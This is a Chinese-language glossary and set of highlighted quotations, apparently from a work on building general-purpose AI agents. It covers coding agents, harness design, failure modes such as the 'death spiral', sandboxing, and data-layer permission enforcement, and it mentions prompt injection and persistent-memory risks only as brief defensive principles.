- **死亡螺旋**：错误触发的恢复逻辑自身又调用 LLM，再次出错，连锁反应失控的故障模式
- **级联中止**：并行工具调用中，某个调用失败时中止依赖其结果的其他调用，但不波及独立调用和父级操作的故障控制机制
- **Agent 状态栏**：每次推理前在上下文末尾以结构化形式注入当前环境状态（工作目录、git 分支、变更概览等）的技术
- **RLVP（验证路径惩罚）**：在最终结果奖励之外对过程中可验证的违规动作施加惩罚，从训练侧内化"不用破坏性手段"为模型常识
- **沙盒（Sandbox）**：与主系统隔离的安全运行空间，代码在其中运行即使出错也不会影响宿主机
- **RPA（机器人流程自动化）**：将成功的 GUI 操作序列固化为可复用代码的技术，是系统适配器在无接口系统上的极端形态
- **自举（Bootstrapping）**：Agent 用代码生成能力创造或修复另一个 Agent，形成"智能的自我繁殖"
- **LSP（Language Server Protocol）**：语言服务器协议，让编辑器与语言分析引擎通信的标准协议，支持"跳转到定义""查找所有引用"
- **HMR（Hot Module Replacement）**：局部热替换，应用运行时替换模块而无需整页刷新即可生效
- **数据层权限下沉**：动态生成软件中将权力判断从动态生成的业务代码移至稳定的数据层强制执行的架构原则

## 高亮核心论断与金句

%%H%%以开放任务为目标的通用 Agent，其核心是一个 Coding Agent 加上文件系统。%%/H%%

%%H%%代码生成不只是工具箱里的一个工具，而是一种元能力——能在运行时动态创造出新的工具和能力。%%/H%%

%%H%%Coding Agent 的高成熟度不是因为代码生成模型特别强，而是因为软件工程几十年积累的基础设施天然构成了一套强大的 Harness。%%/H%%

%%H%%知识的显式化是高效协作的前提。%%/H%%

%%H%%对远程工作友好的团队往往也对 AI Agent 友好。%%/H%%

%%H%%Agent 的可靠性不取决于它犯不犯错，而取决于每类错误是否都有对应的检测、恢复与终止路径。%%/H%%

%%H%%在确认无法恢复之前，不暴露中间态。%%/H%%

%%H%%最后一道防线必须建立在模型无法伪造的数据之上。%%/H%%

%%H%%代码对 Agent 的价值体现在两个层面：思考上形式化让思维高度严谨，表达上执行结果提供客观的对错标准——这是自然语言做不到的。%%/H%%

%%H%%模型与脚手架之间是此消彼长的关系：模型足够强时脚手架可以更薄，模型不够强时就得在脚手架里做更多事情。%%/H%%

%%H%%代码化规则的真正价值不在于优化 token 效率，而在于防止不可逆的错误操作。%%/H%%

%%H%%约束的另一层目的是防止过程性错误——验收基线管的是结果对不对，执行边界管的是过程。%%/H%%

%%H%%代码在这里成了连接任意系统的"万能胶"——哪里接不上，就现场生成一段胶水补上。%%/H%%

%%H%%安全优先于灵活——Agent 只能请求渲染目录中已有的组件，无法注入任意代码。%%/H%%

%%H%%过时的文档比没有文档更糟糕，因为它会误导未来的开发者。%%/H%%

%%H%%提示注入本质上就是一次策反。%%/H%%

%%H%%持久记忆不是并列的第四个必要条件，而是攻击的放大器——把一次性攻击升级为长期的潜伏与放大。%%/H%%

%%H%%信任边界必须下移到数据层：即使 AI 写错了代码，权限约束仍然无法被绕过。%%/H%%

%%H%%生产模式宽容、训练模式严格——双重标准体现了 Harness 与模型训练的深度耦合。%%/H%%

%%H%%评估一个团队的"AI-ready"程度，一个简单的代理指标是：一个远程新人只靠代码仓库和文档，能不能独立开展工作。%%/H%%
